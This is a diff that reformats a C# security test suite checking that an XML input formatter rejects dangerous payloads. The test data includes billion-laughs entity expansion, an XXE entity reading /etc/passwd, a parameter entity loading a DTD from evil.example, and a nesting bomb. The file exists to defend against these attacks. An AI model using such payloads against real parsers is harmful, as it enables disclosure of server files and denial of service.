@@ -6,11 +6,11 @@ using Norse.Infrastructure.Web.Server.Xml;
 namespace Norse.Infrastructure.Web.Server.Tests.Xml;
 
 /// <summary>
-/// The security corpus (design spec §8.1, §15) — the actual point of Task 9. Every payload here must be
-/// rejected session-fatal: exactly one <c>ModelState</c> error, and — the critical, spy-verified part —
-/// <see cref="SpyWidgetShape.Read"/> must never be invoked. None of these payloads may ever "resolve"
-/// (parse successfully with the dangerous content neutralized); they are rejected outright, before
-/// <see cref="XmlContractInputFormatter"/> ever hands the shape a reader.
+///     The security corpus (design spec §8.1, §15) — the actual point of Task 9. Every payload here must be
+///     rejected session-fatal: exactly one <c>ModelState</c> error, and — the critical, spy-verified part —
+///     <see cref="SpyWidgetShape.Read" /> must never be invoked. None of these payloads may ever "resolve"
+///     (parse successfully with the dangerous content neutralized); they are rejected outright, before
+///     <see cref="XmlContractInputFormatter" /> ever hands the shape a reader.
 /// </summary>
 public sealed class SecurityCorpusTests
 {
@@ -21,7 +21,8 @@ public sealed class SecurityCorpusTests
 		var spy = new SpyWidgetShape();
 		var registry = new XmlShapeRegistry();
 		registry.Add(spy);
-		var formatter = new XmlContractInputFormatter(registry, new NorseXmlOptions { CaseStyle = XmlCaseStyle.CamelCase });
+		var formatter =
+			new XmlContractInputFormatter(registry, new NorseXmlOptions { CaseStyle = XmlCaseStyle.CamelCase });
 		var context = FormatterTestSupport.BuildReadContext(body, typeof(Widget));
 
 		var result = await formatter.ReadRequestBodyAsync(context, Encoding.UTF8);
@@ -37,27 +38,36 @@ public sealed class SecurityCorpusTests
 		TheoryData<string, byte[]> data = new()
 		{
 			{ "plain DOCTYPE", Utf8("""<!DOCTYPE widget><widget name="x"/>""") },
-			{ "billion laughs (internal entity expansion)", Utf8("""
+			{
+				"billion laughs (internal entity expansion)", Utf8("""
 				<?xml version="1.0"?>
 				<!DOCTYPE lolz [
 				 <!ENTITY lol "lol">
 				 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 				]>
 				<widget name="&lol1;"/>
-				""") },
-			{ "external entity (classic XXE)", Utf8("""
+				""")
+			},
+			{
+				"external entity (classic XXE)", Utf8("""
 				<?xml version="1.0"?>
 				<!DOCTYPE widget [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 				<widget name="&xxe;"/>
-				""") },
-			{ "parameter entity", Utf8("""
+				""")
+			},
+			{
+				"parameter entity", Utf8("""
 				<?xml version="1.0"?>
 				<!DOCTYPE widget [ <!ENTITY % pe SYSTEM "http://evil.example/pe.dtd"> %pe; ]>
 				<widget name="x"/>
-				""") },
+				""")
+			},
 			{ "33-deep nesting bomb", Utf8(ThirtyThreeDeepNestingBomb()) },
 			{ "UTF-16 BOM payload", FormatterTestSupport.Utf16WithBom("""<widget name="x"/>""") },
-			{ "processing instruction payload", Utf8("""<?xml-stylesheet type="text/xsl" href="style.xsl"?><widget name="x"/>""") },
+			{
+				"processing instruction payload",
+				Utf8("""<?xml-stylesheet type="text/xsl" href="style.xsl"?><widget name="x"/>""")
+			}
 		};
 		return data;
 	}
